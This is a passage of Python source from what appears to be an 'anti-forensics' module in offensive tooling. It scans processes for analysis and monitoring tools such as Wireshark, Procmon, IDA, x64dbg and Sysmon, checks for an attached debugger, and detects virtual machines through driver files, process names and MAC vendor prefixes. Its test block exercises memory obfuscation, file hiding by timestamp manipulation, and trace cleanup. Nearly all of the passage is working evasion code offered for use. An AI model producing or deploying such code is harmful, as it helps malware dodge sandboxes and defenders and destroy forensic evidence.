                'cleanup_on_exit': self.cleanup_on_exit,
                'timestamp_offset': self.timestamp_offset
            }
            
        except Exception as e:
            logger.error(f"Status error: {e}", module="anti_forensics")
            return {}
    
    def _check_detection_vectors(self) -> Dict[str, bool]:
        """Check for potential detection vectors"""
        vectors = {
            'process_analysis': False,
            'network_analysis': False,
            'file_analysis': False,
            'memory_analysis': False,
            'behavior_analysis': False
        }
        
        try:
            # Check for analysis tools
            if platform.system() == 'Windows':
                # Check for common analysis tools
                analysis_tools = [
                    'ProcessHacker', 'ProcessExplorer', 'Procmon',
                    'Wireshark', 'Fiddler', 'IDA', 'OllyDbg',
                    'x64dbg', 'ImmunityDebugger', 'VMware',
                    'VirtualBox', 'Sandboxie'
                ]
                
                for proc in psutil.process_iter(['name']):
                    try:
                        proc_name = proc.info['name'].lower()
                        if any(tool.lower() in proc_name for tool in analysis_tools):
                            vectors['process_analysis'] = True
                            break
                    except:
                        continue
            
            # Check network connections
            try:
                connections = psutil.net_connections()
                if len(connections) > 50:  # Unusually high number of connections
                    vectors['network_analysis'] = True
            except:
                pass
            
            # Check file system monitoring
            try:
                # Look for file system watchers
                for proc in psutil.process_iter(['name']):
                    try:
                        proc_name = proc.info['name'].lower()
                        if any(watcher in proc_name for watcher in ['sysmon', 'filemon', 'inotify']):
                            vectors['file_analysis'] = True
                            break
                    except:
                        continue
            except:
                pass
            
            # Check memory analysis
            try:
                # Check for debugging presence
                import ctypes
                
                # IsDebuggerPresent API
                kernel32 = ctypes.windll.kernel32
                is_debugger_present = kernel32.IsDebuggerPresent()
                
                if is_debugger_present:
                    vectors['memory_analysis'] = True
            except:
                pass
            
            # Check for virtual environment
            try:
                # Check for VM artifacts
                vm_indicators = self._check_vm_indicators()
                if vm_indicators:
                    vectors['behavior_analysis'] = True
            except:
                pass
            
            return vectors
            
        except Exception as e:
            logger.error(f"Detection vector check error: {e}", module="anti_forensics")
            return vectors
    
    def _check_vm_indicators(self) -> bool:
        """Check for virtual machine indicators"""
        try:
            if platform.system() == 'Windows':
                # Check for VM-specific processes
                vm_processes = ['vmtoolsd', 'vboxservice', 'vboxtray', 'vmwaretray']
                
                for proc in psutil.process_iter(['name']):
                    try:
                        proc_name = proc.info['name'].lower()
                        if any(vm_proc in proc_name for vm_proc in vm_processes):
                            return True
                    except:
                        continue
                
                # Check for VM-specific files
                vm_files = [
                    'C:\\Windows\\System32\\drivers\\vmmouse.sys',
                    'C:\\Windows\\System32\\drivers\\vm3dmp.sys',
                    'C:\\Windows\\System32\\drivers\\vmmemctl.sys'
                ]
                
                for vm_file in vm_files:
                    if os.path.exists(vm_file):
                        return True
            
            # Check MAC address (VM vendors have specific OUI)
            try:
                import netifaces
                for iface in netifaces.interfaces():
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_LINK in addrs:
                        mac = addrs[netifaces.AF_LINK][0]['addr'].lower()
                        # Check for VM vendor OUIs
                        vm_ouis = ['00:0c:29', '00:50:56', '00:05:69', '08:00:27']
                        if any(mac.startswith(oui) for oui in vm_ouis):
                            return True
            except:
                pass
            
            return False
            
        except:
            return False
    
    def cleanup_on_exit_handler(self):
        """Cleanup handler for exit"""
        if self.cleanup_on_exit:
            logger.info("Performing cleanup on exit...", module="anti_forensics")
            self.clean_traces(level=self.obfuscation_level)

# Global instance
_anti_forensics_manager = None

def get_anti_forensics_manager(config: Dict = None) -> AntiForensicsManager:
    """Get or create anti-forensics manager instance"""
    global _anti_forensics_manager
    
    if _anti_forensics_manager is None:
        _anti_forensics_manager = AntiForensicsManager(config)
    
    return _anti_forensics_manager

if __name__ == "__main__":
    # Test anti-forensics manager
    afm = get_anti_forensics_manager({
        'stealth_mode': True,
        'obfuscation_level': 3,
        'cleanup_on_exit': False
    })
    
    print("Testing anti-forensics manager...")
    
    # Test memory obfuscation
    test_data = b"This is a secret message that needs obfuscation!"
    obfuscated = afm.obfuscate_memory(test_data)
    deobfuscated = afm.deobfuscate_memory(obfuscated)
    
    print(f"Memory obfuscation test:")
    print(f"Original: {test_data}")
    print(f"Obfuscated: {len(obfuscated)} bytes")
    print(f"Deobfuscated: {deobfuscated}")
    print(f"Match: {test_data == deobfuscated}")
    
    # Create test file for hiding
    test_file = "test_secret.txt"
    with open(test_file, 'w') as f:
        f.write("Sensitive information here\n")
    
    # Test file hiding (timestamp manipulation)
    success = afm.hide_file(test_file, "timestamp")
    print(f"\nFile hide test (timestamp): {'Success' if success else 'Failed'}")
    
    # Check system status
    status = afm.get_system_status()
    print(f"\n🕵️‍♂️ Anti-Forensics System Status:")
    print(f"  Stealth mode: {status['stealth_mode']}")
    print(f"  Obfuscation level: {status['obfuscation_level']}")
    print(f"  System: {status['system']}")
    print(f"  Username: {status['username']}")
    
    # Check detection vectors
    print(f"\nDetection Vectors:")
    for vector, detected in status['detection_vectors'].items():
        print(f"  {vector}: {'⚠️ DETECTED' if detected else '✅ CLEAR'}")
    
    # Test trace cleanup
    print(f"\nTesting trace cleanup...")
    cleaned = afm.clean_traces(level=2)
    print(f"Cleaned traces: {cleaned}")
    
    # Cleanup test file
    if os.path.exists(test_file):
        os.remove(test_file)
    
    print("\n✅ Anti-forensics tests completed!")
